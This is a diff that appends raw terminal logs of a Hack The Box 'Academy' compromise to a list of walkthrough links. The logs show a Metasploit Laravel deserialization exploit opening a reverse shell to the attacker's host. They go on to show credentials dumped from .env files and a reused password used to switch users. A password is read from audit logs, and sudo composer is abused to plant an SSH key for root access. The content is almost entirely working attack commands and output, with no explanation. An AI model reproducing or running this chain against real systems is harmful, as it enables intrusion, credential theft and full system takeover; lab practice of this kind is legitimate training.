@@ -250,3 +250,443 @@ https://sheerazali.com/postman-writeup-walkthrough-hack-the-box/
 Silo
 https://cyruslab.net/2020/05/08/hacktheboxsilo/
 official
+
+
+
+-------------------------------------
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
+
+
+msf5 > use 0
+msf5 exploit(unix/http/laravel_token_unserialize_exec) > show options 
+
+Module options (exploit/unix/http/laravel_token_unserialize_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   APP_KEY                     no        The base64 encoded APP_KEY string from the .env file
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Path to target webapp
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(unix/http/laravel_token_unserialize_exec) > set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+app_key => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+msf5 exploit(unix/http/laravel_token_unserialize_exec) > set rhosts academy.htb
+rhosts => academy.htb
+msf5 exploit(unix/http/laravel_token_unserialize_exec) > set lhost tun0
+lhost => 10.10.14.7
+msf5 exploit(unix/http/laravel_token_unserialize_exec) > set vhost dev-staging-01.academy.htb
+vhost => dev-staging-01.academy.htb
+msf5 exploit(unix/http/laravel_token_unserialize_exec) > run
+
+[*] Started reverse TCP handler on 10.10.14.7:4444 
+[*] Command shell session 1 opened (10.10.14.7:4444 -> 10.10.10.215:39620) at 2020-11-10 20:20:02 -0500
+
+whoami
+www-data
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls
+ls
+css  favicon.ico  index.php  js  robots.txt  web.config
+www-data@academy:/var/www/html/htb-academy-dev-01/public$ cd
+cd
+bash: cd: HOME not set
+www-data@academy:/var/www/html/htb-academy-dev-01/public$ cd academy
+cd academy
+bash: cd: academy: No such file or directory
+www-data@academy:/var/www/html/htb-academy-dev-01/public$ env
+env
+DB_PASSWORD=secret
+MAIL_PORT=2525
+MAIL_DRIVER=smtp
+REDIS_PASSWORD=null
+REDIS_HOST=127.0.0.1
+MIX_PUSHER_APP_CLUSTER=mt1
+PWD=/var/www/html/htb-academy-dev-01/public
+CACHE_DRIVER=file
+DB_PORT=3306
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+PUSHER_APP_CLUSTER=mt1
+MAIL_USERNAME=null
+APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+APP_ENV=local
+MAIL_PASSWORD=null
+APP_DEBUG=true
+INVOCATION_ID=3f94d951bf48412d9512e94119e20ea9
+APP_URL=http://localhost
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+DB_USERNAME=homestead
+PUSHER_APP_ID=
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+PUSHER_APP_KEY=
+APACHE_RUN_GROUP=www-data
+PUSHER_APP_SECRET=
+MIX_PUSHER_APP_KEY=
+APACHE_LOCK_DIR=/var/lock/apache2
+APP_NAME=Laravel
+SHLVL=1
+LOG_CHANNEL=stack
+BROADCAST_DRIVER=log
+REDIS_PORT=6379
+LC_CTYPE=C.UTF-8
+APACHE_RUN_DIR=/var/run/apache2
+SESSION_DRIVER=file
+JOURNAL_STREAM=9:22813
+APACHE_RUN_USER=www-data
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+MAIL_ENCRYPTION=null
+MAIL_HOST=smtp.mailtrap.io
+DB_DATABASE=homestead
+SESSION_LIFETIME=120
+QUEUE_DRIVER=sync
+_=/usr/bin/env
+www-data@academy:/var/www/html/htb-academy-dev-01/public$ 
+
+www-data@academy:/var/www/html/htb-academy-dev-01/public$ cd ..
+cd ..
+www-data@academy:/var/www/html/htb-academy-dev-01$ ls
+ls
+app	   composer.json  database	public	   routes      tests
+artisan    composer.lock  package.json	readme.md  server.php  vendor
+bootstrap  config	  phpunit.xml	resources  storage     webpack.mix.js
+www-data@academy:/var/www/html/htb-academy-dev-01$ cd academy	
+cd academy
+bash: cd: academy: No such file or directory
+www-data@academy:/var/www/html/htb-academy-dev-01$ cd ..
+cd ..
+www-data@academy:/var/www/html$ ls
+ls
+academy  htb-academy-dev-01  index.php
+www-data@academy:/var/www/html$ cd academy
+cd academy
+www-data@academy:/var/www/html/academy$ ls
+ls
+app	   composer.json  database	public	   routes      tests
+artisan    composer.lock  package.json	readme.md  server.php  vendor
+bootstrap  config	  phpunit.xml	resources  storage     webpack.mix.js
+www-data@academy:/var/www/html/academy$ ls -la
+ls -la
+total 280
+drwxr-xr-x 12 www-data www-data   4096 Aug 13 12:42 .
+drwxr-xr-x  4 root     root       4096 Aug 13 12:36 ..
+-rw-r--r--  1 www-data www-data    706 Aug 13 12:42 .env
+-rw-r--r--  1 www-data www-data    651 Feb  7  2018 .env.example
+-rw-r--r--  1 www-data www-data    111 Feb  7  2018 .gitattributes
+-rw-r--r--  1 www-data www-data    155 Feb  7  2018 .gitignore
+drwxr-xr-x  6 www-data www-data   4096 Feb  7  2018 app
+-rwxr-xr-x  1 www-data www-data   1686 Feb  7  2018 artisan
+drwxr-xr-x  3 www-data www-data   4096 Feb  7  2018 bootstrap
+-rw-r--r--  1 www-data www-data   1512 Feb  7  2018 composer.json
+-rw-r--r--  1 www-data www-data 191621 Aug  9 11:57 composer.lock
+drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 config
+drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 database
+-rw-r--r--  1 www-data www-data   1150 Feb  7  2018 package.json
+-rw-r--r--  1 www-data www-data   1040 Feb  7  2018 phpunit.xml
+drwxr-xr-x  4 www-data www-data   4096 Nov  9 10:13 public
+-rw-r--r--  1 www-data www-data   3622 Feb  7  2018 readme.md
+drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 resources
+drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 routes
+-rw-r--r--  1 www-data www-data    563 Feb  7  2018 server.php
+drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 storage
+drwxr-xr-x  4 www-data www-data   4096 Feb  7  2018 tests
+drwxr-xr-x 38 www-data www-data   4096 Aug  9 11:57 vendor
+-rw-r--r--  1 www-data www-data    549 Feb  7  2018 webpack.mix.js
+www-data@academy:/var/www/html/academy$ cat .env
+cat .env
+APP_NAME=Laravel
+APP_ENV=local
+APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+APP_DEBUG=false
+APP_URL=http://localhost
+
+LOG_CHANNEL=stack
+
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=academy
+DB_USERNAME=dev
+DB_PASSWORD=mySup3rP4s5w0rd!!
+
+BROADCAST_DRIVER=log
+CACHE_DRIVER=file
+SESSION_DRIVER=file
+SESSION_LIFETIME=120
+QUEUE_DRIVER=sync
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+MAIL_DRIVER=smtp
+MAIL_HOST=smtp.mailtrap.io
+MAIL_PORT=2525
+MAIL_USERNAME=null
+MAIL_PASSWORD=null
+MAIL_ENCRYPTION=null
+
+PUSHER_APP_ID=
+PUSHER_APP_KEY=
+PUSHER_APP_SECRET=
+PUSHER_APP_CLUSTER=mt1
+
+MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
+MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+www-data@academy:/var/www/html/academy$ 
+
+www-data@academy:/var/www/html/academy$ ls -al /home
+ls -al /home
+total 32
+drwxr-xr-x  8 root     root     4096 Aug 10 00:34 .
+drwxr-xr-x 20 root     root     4096 Aug  7 12:07 ..
+drwxr-xr-x  2 21y4d    21y4d    4096 Aug 10 00:34 21y4d
+drwxr-xr-x  2 ch4p     ch4p     4096 Aug 10 00:34 ch4p
+drwxr-xr-x  4 cry0l1t3 cry0l1t3 4096 Aug 12 21:58 cry0l1t3
+drwxr-xr-x  3 egre55   egre55   4096 Aug 10 23:41 egre55
+drwxr-xr-x  2 g0blin   g0blin   4096 Aug 10 00:34 g0blin
+drwxr-xr-x  5 mrb3n    mrb3n    4096 Aug 12 22:19 mrb3n
+www-data@academy:/var/www/html/academy$ su cy0l1t3
+su cy0l1t3
+su: user cy0l1t3 does not exist
+www-data@academy:/var/www/html/academy$ su cry0l1t3
+su cry0l1t3
+Password: mySup3rP4s5w0rd!!
+
+$ whoami
+whoami
+cry0l1t3
+$ ^C
+Abort session 1? [y/N]  y
+""
+
+[*] 10.10.10.215 - Command shell session 1 closed.  Reason: User exit
+msf5 exploit(unix/http/laravel_token_unserialize_exec) > exit
+[*] You have active sessions open, to exit anyway type "exit -y"
+msf5 exploit(unix/http/laravel_token_unserialize_exec) > exit
+[*] You have active sessions open, to exit anyway type "exit -y"
+msf5 exploit(unix/http/laravel_token_unserialize_exec) > exit -y
+root@kali:~/Downloads# ssh-keygen -f id_rsa
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in id_rsa.
+Your public key has been saved in id_rsa.pub.
+The key fingerprint is:
+SHA256:K87FeJdrLcaIQNzuOrpdMZW+kxHccuCr8k2FRsgOCjM root@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|        .        |
+|     . + +       |
+|E  ...o O o      |
+| + .oo.+ *       |
+|  .. .+ S .      |
+|    . .B * .     |
+|    .o=.Xoo.     |
+|   ..*o*.o=..    |
+|  oooo+ .o..     |
++----[SHA256]-----+
+root@kali:~/Downloads# cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHDtcwXVWCIoOxdRweBiZOs0z4v/CJpCpLlr/5ZdiMFsvXrsp67f3xfi/dYK18PzcP7XbYL0IhXlXYfHqLslZIuyQ6Ttt1Y3RQes4ukvgQQN5qnSRfg/5oaz91SGavtL0y+6p3f+EI0x/qbKBF7irakl1IUoL+3H8c223hdu05Ir3bOHn6oL9Ip41SgRZGSK17Uv4RlgJTKc1Ie8zJKLq00PAllcKCyHatqaC8eq4NVraZVOuy0PI4RwqyL4CLU9jG+ZUXcwZupd4jLfQhplJnSVNN1iv5DZs4mHjp91p7YoVfbkJXP8zZFb60Q9Fn/ro782VojqIA8BSc5YD9YkHiOkS7NXpJXfIcNknjNSRxACt0iY7f25iNriDXcb7uLUTr9+swtYpg0HYg/q6iI38YXLfSxJOMRT2Fzot3YUfi/d5peIxOKmTciUk6jpKB5MyEwz6mxgFjci3fqVZl6Ssu0nUbKcZ1YDqeZvUABT32hXk/Wo8vzDY7FQYLKzHfu70= root@kali
+root@kali:~/Downloads# 
+
+
+
+root@kali:~/Downloads# ssh cry0l1t3
+ssh: Could not resolve hostname cry0l1t3: Name or service not known
+root@kali:~/Downloads# ssh cry0l1t3@academy.htb
+The authenticity of host 'academy.htb (10.10.10.215)' can't be established.
+ECDSA key fingerprint is SHA256:4v7BvR4VfuEwrmXljKvXmF+JjLCgP/46G78oNEHzt2c.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'academy.htb,10.10.10.215' (ECDSA) to the list of known hosts.
+cry0l1t3@academy.htb's password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 11 Nov 2020 01:29:58 AM UTC
+
+  System load:             0.0
+  Usage of /:              44.4% of 15.68GB
+  Memory usage:            15%
+  Swap usage:              0%
+  Processes:               173
+  Users logged in:         0
+  IPv4 address for ens160: 10.10.10.215
+  IPv6 address for ens160: dead:beef::250:56ff:feb9:4914
+
+ * Introducing self-healing high availability clustering for MicroK8s!
+   Super simple, hardened and opinionated Kubernetes for production.
+
+     https://microk8s.io/high-availability
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+
+Last login: Wed Aug 12 21:58:45 2020 from 10.10.14.2
+$ 
+$ 
+$ 
+$ ls
+user.txt
+$ groups
+cry0l1t3 adm
+$ cd /avr/log/audit
+-sh: 7: cd: can't cd to /avr/log/audit
+$ ls
+user.txt
+$ cat audit.lo.3 | grep "uid=1002 | more"
+cat: audit.lo.3: No such file or directory
+$ ls  
+user.txt
+$ cat audit.log.3
+cat: audit.log.3: No such file or directory
+$ cat /var/log/audit.log.3 | grep "uid=1002" | more
+cat: /var/log/audit.log.3: No such file or directory
+$ cd /var/log/audit
+$ ls
+audit.log  audit.log.1	audit.log.2  audit.log.3
+$ cat audit.log.3 | grep "uid=1002" | more
+type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=
+4 minor=1 comm="sh" data=7375206D7262336E0A
+type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=
+4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
+type=USER_AUTH msg=audit(1597199304.778:85): pid=2520 uid=1002 auid=0 ses=1 msg=
+'op=PAM:authentication grantors=pam_permit,pam_cap acct="mrb3n" exe="/usr/bin/su
+" hostname=academy addr=? terminal=tty1 res=success'
+type=USER_ACCT msg=audit(1597199304.778:86): pid=2520 uid=1002 auid=0 ses=1 msg=
+'op=PAM:accounting grantors=pam_permit acct="mrb3n" exe="/usr/bin/su" hostname=a
+cademy addr=? terminal=tty1 res=success'
+type=CRED_ACQ msg=audit(1597199304.778:87): pid=2520 uid=1002 auid=0 ses=1 msg='
+op=PAM:setcred grantors=pam_permit,pam_cap acct="mrb3n" exe="/usr/bin/su" hostna
+me=academy addr=? terminal=tty1 res=success'
+type=USER_START msg=audit(1597199304.778:88): pid=2520 uid=1002 auid=0 ses=1 msg
+='op=PAM:session_open grantors=pam_env,pam_env,pam_mail,pam_limits,pam_tty_audit
+,pam_permit,pam_umask,pam_unix,pam_systemd acct="mrb3n" exe="/usr/bin/su" hostna
+me=academy addr=? terminal=tty1 res=success'
+type=USER_END msg=audit(1597199317.622:91): pid=2520 uid=1002 auid=0 ses=1 msg='
+op=PAM:session_close grantors=pam_env,pam_env,pam_mail,pam_limits,pam_tty_audit,
+pam_permit,pam_umask,pam_unix,pam_systemd acct="mrb3n" exe="/usr/bin/su" hostnam
+e=academy addr=? terminal=tty1 res=success'
+type=CRED_DISP msg=audit(1597199317.622:92): pid=2520 uid=1002 auid=0 ses=1 msg=
+'op=PAM:setcred grantors=pam_permit acct="mrb3n" exe="/usr/bin/su" hostname=acad
+$ su mrb3n
+Password: 
+$ ls
+ls: cannot open directory '.': Permission denied
+$ whoami
+mrb3n
+$ sudo -l
+[sudo] password for mrb3n: 
+Matching Defaults entries for mrb3n on academy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mrb3n may run the following commands on academy:
+    (ALL) /usr/bin/composer
+$ cd ~
+$ ls
+$ nnao composer.json
+sh: 6: nnao: not found
+$ nano composer.json
+$ sudo composer run-script command
+PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+Do not run Composer as root/super user! See https://getcomposer.org/root for details
+> mkdir /root/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHDtcwXVWCIoOxdRweBiZOs0z4v/CJpCpLlr/5ZdiMFsvXrsp67f3xfi/dYK18PzcP7XbYL0IhXlXYfHqLslZIuyQ6Ttt1Y3RQes4ukvgQQN5qnSRfg/5oaz91SGavtL0y+6p3f+EI0x/qbKBF7irakl1IUoL+3H8c223hdu05Ir3bOHn6oL9Ip41SgRZGSK17Uv4RlgJTKc1Ie8zJKLq00PAllcKCyHatqaC8eq4NVraZVOuy0PI4RwqyL4CLU9jG+ZUXcwZupd4jLfQhplJnSVNN1iv5DZs4mHjp91p7YoVfbkJXP8zZFb60Q9Fn/ro782VojqIA8BSc5YD9YkHiOkS7NXpJXfIcNknjNSRxACt0iY7f25iNriDXcb7uLUTr9+swtYpg0HYg/q6iI38YXLfSxJOMRT2Fzot3YUfi/d5peIxOKmTciUk6jpKB5MyEwz6mxgFjci3fqVZl6Ssu0nUbKcZ1YDqeZvUABT32hXk/Wo8vzDY7FQYLKzHfu70=' >> /root/.ssh/authorized_keys
+mkdir: cannot create directory ‘/root/.ssh’: File exists
+$ ls      
+composer.json
+$ nano composer.json
+$ ls
+composer.json
+$ pwd
+/home/mrb3n
+$ nano composer.json
+
+
+Use "fg" to return to nano.
+[1] + Stopped (signal)           nano composer.json
+$ ls
+$ ls -l
+total 0
+$ cd ~
+$ ls
+$ 
+$ 
+$ 
+$ 
+$ whoami
+mrb3n
+$ 
+$ 
+$ 
+$ 
+$ exit
+You have stopped jobs.
+$ exit
+Received SIGHUP or SIGTERM
+$ exit
+Connection to academy.htb closed.
+root@kali:~/Downloads# ssh -i id_rsa root@academy.htb 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 11 Nov 2020 01:50:10 AM UTC
+
+  System load:             0.0
+  Usage of /:              44.4% of 15.68GB
+  Memory usage:            15%
+  Swap usage:              0%
+  Processes:               172
+  Users logged in:         0
+  IPv4 address for ens160: 10.10.10.215
+  IPv6 address for ens160: dead:beef::250:56ff:feb9:4914
+
+ * Introducing self-healing high availability clustering for MicroK8s!
+   Super simple, hardened and opinionated Kubernetes for production.
+
+     https://microk8s.io/high-availability
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Nov  9 10:11:49 2020
+root@academy:~# ls
+academy.txt  root.txt  snap
+root@academy:~# cat root.txt 
+root@academy:~# 
